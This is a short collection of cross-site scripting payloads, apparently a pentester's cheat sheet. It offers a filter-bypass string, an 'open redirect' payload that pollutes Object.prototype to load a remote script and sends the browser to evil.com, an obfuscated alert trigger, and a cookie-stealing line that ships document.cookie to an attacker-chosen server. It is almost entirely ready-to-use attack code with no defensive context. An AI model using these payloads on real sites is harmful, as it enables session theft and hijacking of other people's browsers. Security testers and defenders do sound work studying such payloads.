```Basic bypass```

}<x>xxx<!--><!>+>+></Script+xxx></script%20x></x><x>xxx<!--><!>+>+>


```Open redirect```

}<x>xxx<!--><!>+>+></Script+xxx><Script+xxx>Object.prototype.BOOMR = 1;
Object.prototype.url = 'https://portswigger-labs.net/xss/xss.js';
location.replace('https://evil.com');</script%20x></x><x>xxx<!--><!>+>+>


```XSS trigger alert```

<x>xxx<!--><!>+>+></Script+xxx><script%20x>window/*xxx*/['al'%2b'ert'](1);//</script%20x></x><x>xxx<!--><!>+>+>

```XSS steal cookies```

window/*xxx*/['loca' + 'tion'] = 'http://<your-server>?cookie=' + document/*xxx*/['coo' + 'kie'];
